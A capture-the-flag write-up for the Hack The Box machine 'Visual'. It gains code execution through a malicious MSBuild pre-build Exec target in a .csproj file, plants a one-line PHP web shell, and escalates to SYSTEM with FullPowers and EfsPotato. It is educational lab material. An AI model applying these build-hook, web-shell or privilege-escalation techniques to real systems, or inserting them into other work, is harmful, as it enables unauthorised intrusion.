+++
title = "HTB - Visual"
description = "HTB Writeup: Visual - RCE via MSBuild and privilege escalation using EFS Potato"
date = '2025-03-28'
tags = ["windows", "htb", "rce", "privilege escalation", "msbuild", "efs potato"]
weight = 3
+++


## Introduction 🖥️

Visual is a 2019 Windows Server, vulnerable to remote code execution through a misconfigured VS compilation service. After gaining initial access, users are able to pivot to the service account of the locally running web server. Once full privileges have been restored to the service account, users are able to perform a token impersonation attack via the EFS Potato exploit.

![Visual Walkthrough](Visual/img/Visual.png)  
*Source: [HackTheBox](https://www.hackthebox.com/machines/visual)*

## Scanning/Enum 🔍

Starting off we begin with a port scan. This scan is quick but it makes quite a bit of noise so do keep that in mind.

```bash
nmap -T4 -A -p- 10.10.11.234
```

Here is our scan broken down:

- **T4** - Timing template. T4 is pretty fast, and not stealthy at all.  
- **A** - OS Detection (-O), Version Detection (-sV), Script Scanning (-sC), and traceroute.  
- **p-** - Scans all ports.

![Nmap Output](Visual/img/nmap.png)

After scanning all 65535 ports, we see that the only open service is a single Apache web server on port 80.

## Port 80, HTTP 🌎

Under further inspection, we see that the website is a compilation service for Visual Studio projects.

![HTTP View 1](Visual/img/HTTP1.png)  
![HTTP View 2](Visual/img/HTTP2.png)  
![Successful Build](Visual/img/success_build.png)

According to the site, when supplied with a git repo, the server will clone and build the project, returning the compiled binaries. Let's see how we can exploit this service.

Here are some useful resources:

- [A Quick and Hacky way to Serve a Git Repo over HTTP](https://theartofmachinery.com/2016/07/02/git_over_http.html)
- [MSBuild 101](https://www.creepingcoder.com/2020/06/01/msbuild-101-using-the-exit-code-from-a-command/)
- [Exec Task MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-task-reference?view=vs-2022)

For those unfamiliar, [MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2022) is the project build system of Visual Studio. Visual Studio projects contain `.sln` and `.csproj` files which support "Tasks"—custom build operations. By including one that runs a malicious payload, we should gain access.

## Foothold 🆗

Great, now that we know we can configure MSBuild to execute commands listed in our project files, let's pop a shell.

To exploit the build service, our git repo should contain:

### `hackme.sln`

```
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
...
Project("{...}") = "hackme", "hackme.csproj", "{fdbe3b6d-...}"
...
```

### `hackme.csproj`

```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
  </PropertyGroup>

  <Target Name="CustomPreBuild" BeforeTargets="BeforeBuild">
    <Exec Command=".\booty.exe" />
  </Target>
</Project>
```

This `<Target>` section executes our payload (`booty.exe`).

We prepare our git repo like so:

![Payload Generation](Visual/img/payload_gen.png)

```bash
cd .git/
git --bare update-server-info
mv hooks/post-update.sample hooks/post-update
python3 -m http.server 80   # Blocking
```

Now we submit the project build request. If it works, we get a shell as `visual\enox`.

![Foothold Shell](Visual/img/foothold.png)  
*(noice)*

## Pivot 💃🏽

Looking for privilege escalation vectors, we explore the `C:\xampp` directory:

![XAMPP Root](Visual/img/root_dir.png)

This confirms the use of a XAMPP stack. We list contents of `C:\xampp\htdocs`:

![Web Directory](Visual/img/web_dir.png)

We drop a PHP web shell:

```bash
echo "<?php system($_GET['cmd']); ?>" > C:\xampp\htdocs\cmd.php
```

Visit `http://10.10.11.234/cmd.php?cmd=<cmd>` to execute commands.

![PHP CMD](Visual/img/cmd_php.png)

A quick `whoami` shows the web server runs under the Local Service account.

![Pivot Shell](Visual/img/pivot_shell.png)

## System 🪙

According to [Microsoft](https://learn.microsoft.com/en-us/windows/win32/services/localservice-account), the LocalService account *should* have privileges like:

- SE_ASSIGNPRIMARYTOKEN_NAME
- SE_IMPERSONATE_NAME
- SE_SHUTDOWN_NAME
- etc...

But a `whoami /priv` shows we’re missing many of them:

![Missing Privs](Visual/img/svc_priv.png)

We’ll restore privileges using [FullPowers](https://github.com/itm4n/FullPowers), which abuses Task Scheduler:

![Full Powers](Visual/img/full_powers.png)

Once privileges are restored, we can run [EFS Potato](https://github.com/zcgonvh/EfsPotato.git):

First, locate the C# compiler:

```bash
where /R C:\ "csc.exe"
```

![Where CSC](Visual/img/where_csc.png)

Compile the exploit:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe EfsPotato.cs
```

![CSC Build](Visual/img/csc_build.png)

Run the binary:

```bash
.\EfsPotato.exe <cmd>
```

![EFS Potato Result](Visual/img/efspotato.png)

Now we're NT AUTHORITY\SYSTEM 😎

You can now read the flag at `C:\Users\Administrator\Desktop\root.txt` or spawn a Meterpreter session.

## Resources 📘

- [A Quick and Hacky way to Serve a Git Repo over HTTP](https://theartofmachinery.com/2016/07/02/git_over_http.html)
- [MSBuild 101](https://www.creepingcoder.com/2020/06/01/msbuild-101-using-the-exit-code-from-a-command/)
- [Understanding .sln/.csproj/.vxproj Files](https://chat.openai.com/share/df65e56c-a0ab-45ec-a4f0-3175f123cda6)